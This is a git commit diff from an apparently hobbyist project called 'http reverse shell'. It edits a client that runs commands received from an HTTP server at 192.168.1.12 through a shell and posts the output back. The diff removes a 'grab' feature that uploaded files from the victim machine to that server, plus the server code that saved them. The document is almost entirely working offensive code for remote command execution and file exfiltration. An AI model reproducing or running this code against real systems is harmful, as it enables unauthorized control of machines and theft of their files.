f426c0a454e8eb259eb4ee0a4c87d9a001320aca
Sandesh Adhikari <sandeshadhikari92@gmail.com>
2020-12-22 17:23:08 +0545

    http reverse shell

--- client_http.py
+++ client_http.py
@@ -9,14 +9,7 @@ while True:
 
      if 'terminate' in command:
          break
-     elif 'grab' in command:
-         grab,path = command.split("*")
-         if os.path.exists(path):
-             url = "http://192.168.1.12:8080/data"
-             files = {'file': open(path,'rb')}
-             r = requests.post(url, files=files)
-         else:
-             post_response = requests.post(url='http://192.168.1.12:8080', data='Not able to find file')
+     
      
      else:
          CMD = subprocess.Popen(command, shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE)
--- server_http.py
+++ server_http.py
@@ -13,29 +13,12 @@ class MyHandler(http.server.BaseHTTPRequestHandler):
        self.wfile.write(command.encode())
 
    def do_POST(self):
-        if s.path == '/data':
-            try:
-                ctype, pdict = cgi.parse_header(s.headers.getheader('content-type'))
-                if ctype == 'multipart/form-data' :
-                    fs = cgi.FieldStorage( fp = s.rfile, 
-                                        headers = s.headers, 
-                                        environ={ 'REQUEST_METHOD':'POST' } 
-                                      )
-                else:
-                    print "[-] Unexpected POST request"
-                fs_up = fs['file']
-                with open('/root/Desktop/1.txt', 'wb') as o:
-                    o.write( fs_up.file.read() )
-                    s.send_response(200)
-                    s.end_headers()
-            except Exception as e:
-                print e
-            return       
-         self.send_response(200)
-         self.end_headers()
-         length = int(self.headers['Content-length'])
-         postVar = self.rfile.read(length)
-         print(postVar.decode())
+              
+        self.send_response(200)
+        self.end_headers()
+        length = int(self.headers['Content-length'])
+        postVar = self.rfile.read(length)
+        print(postVar.decode())
 
 if __name__ == "__main__":
     server_class = http.server.HTTPServer
